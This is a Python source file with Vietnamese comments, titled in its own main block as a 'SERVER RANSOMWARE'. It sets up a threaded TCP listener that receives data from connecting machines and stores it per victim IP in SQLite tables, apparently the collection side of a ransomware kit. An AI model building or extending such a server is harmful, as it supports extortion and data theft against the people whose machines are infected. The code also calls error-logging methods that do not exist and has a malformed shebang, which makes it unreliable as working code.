#!user/bin/env python3
# Import modules
import os
import sqlite3
import datetime
from time import sleep
from threading import Thread
from ..modules.color import System, Col
from socket import socket, AF_INET, SOCK_STREAM

# Lớp Server để xử lý các kết nối và truyền dữ liệu
class Server:
    def __init__(self, host: str, port: int) -> None:
        self.host: str = host
        self.port: int = port
        self.logserver = SqliteLog()
        self.server = socket(AF_INET, SOCK_STREAM)

    # Xử lý dữ liệu từ mỗi client
    def HandleClient(self, client, address) -> None:
        while True:
            try:
                data = client.recv(4096)
                if not data:
                    break
                if not isinstance(data, bytes): 
                    data = data.encode('utf-8')
                self.logserver.activity(address[0], data)
                Console(address[0], round(len(data)/1024, 3), 1)
            except Exception as error:
                Console(address[0], error, 3)
                self.logserver.error(error)
                break
        client.close()
        Console(address[0], 'Disconnect', 2)

    # Xử lý các kết nối đến server
    def HandleConnections(self) -> None:
        while True:
            client, address = self.server.accept()
            Console(address[0], None, 0)
            thread = Thread(target=self.HandleClient, args=(client, address))
            thread.start()

    # Bắt đầu lắng nghe các kết nối đến server
    def Listening(self) -> None:
        try:
            self.server.bind((self.host, self.port))
            self.server.listen()
            Console('SYSTEM', 'The server starts listening', 2)
            thread = Thread(target=self.HandleConnections)
            thread.start()
        except:
            Console('ERROR', 'Address already in use', 3)

# Lớp SqliteLog để lưu trữ các hoạt động và lỗi vào cơ sở dữ liệu SQLite
class SqliteLog:
    def __init__(self) -> None:
        self.conn = None
        self.cursor = None

    # Kết nối đến cơ sở dữ liệu
    def connect(self) -> None:
        if not os.path.exists('data'):
            os.makedirs('data')
        self.conn = sqlite3.connect(f'data/server.db')
        self.cursor = self.conn.cursor()

    # Tạo bảng trong cơ sở dữ liệu
    def createTable(self, table_name) -> None:
        self.cursor.execute(f'''
                CREATE TABLE IF NOT EXISTS {table_name} (
                    activity TEXT,
                    timestamp TEXT
                )
            ''')
        self.conn.commit()

    # Ghi hoạt động của mỗi IP vào cơ sở dữ liệu
    def activity(self, ip: str, activity: str) -> None:
        try:
            self.connect()
            ip = ip.replace('.', '_')
            self.createTable(f'IP_{ip}')
            timestamp = datetime.datetime.now().strftime('%m-%d %H:%M:%S')
            self.cursor.execute(f'''
                INSERT INTO IP_{ip} (activity, timestamp) VALUES (?, ?)
            ''', (activity, timestamp))
            self.conn.commit()
        except Exception as error:
           Console('ERROR', str(error), 3)
           self.logserver.error(error)
        finally:
            self.close()

    # Đóng kết nối đến cơ sở dữ liệu
    def close(self) -> None:
        if self.conn:
            self.conn.close()

# Hàm Console để in thông điệp ra console 
def Console(ip: str, msg: str, select) -> None:
    messages = {
        0: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Green}Connect to the Server{Col.White}.",
        1: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Yellow}Packet data: {msg} KB{Col.White}.",
        2: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Orange}{msg}{Col.White}.",
        3: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Red}{msg}{Col.White}."
    }
    print(messages.get(select, f" [{Col.Pink}{ip}{Col.White}] --> Unknown message: {msg}"))

# Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
if __name__ == '__main__':
    Terminal = System()
    try:
        Terminal.clear()
        Terminal.title('SERVER RANSOMWARE')
        Terminal.size(320, 240)
        Terminal.init()
        Server('192.168.1.12', 19100).Listening()
    except Exception as error:
        Console('ERROR', error, 3)
        sleep(10)
        Terminal.reset()
        

